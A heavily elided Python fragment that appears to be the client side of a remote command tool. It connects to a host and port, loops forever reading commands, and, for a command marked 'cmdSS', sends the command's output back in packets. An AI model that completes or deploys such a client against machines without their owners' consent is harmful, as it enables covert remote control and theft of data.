...
def sendPackets(sckt: socket, dataToSend: bytearray, debug: bool):
    try:
        ...
        for i in range(numberOfPacketsToSend):
            ...
            packet = packetHeaderLength + packetHeaderPackets + packetPayload
...
def comunicazione(HOST, PORT, debug: bool = False):
    ...
    while 1:
        ...
        if "cmdSS" in command:
            ...
            sendPackets(clientSocket, output.stdout, True)
            # DEBUG
